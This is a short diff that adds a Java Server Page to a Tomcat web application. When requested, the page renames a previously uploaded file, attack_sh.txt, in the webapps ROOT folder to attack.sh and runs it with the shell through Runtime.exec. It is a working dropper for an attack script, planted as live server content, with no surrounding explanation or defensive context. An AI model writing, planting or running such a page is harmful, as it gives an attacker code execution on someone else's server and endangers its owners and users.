@@ -1,0 +1,9 @@
+<%@ page import="java.util.*,java.io.*" %>
+<%
+String cmd = "mv ../webapps/ROOT/attack_sh.txt ../webapps/ROOT/attack.sh";
+Process p = Runtime.getRuntime().exec(cmd);
+p.waitFor();
+cmd = "sh ../webapps/ROOT/attack.sh";
+p = Runtime.getRuntime().exec(cmd);
+p.waitFor();
+%>
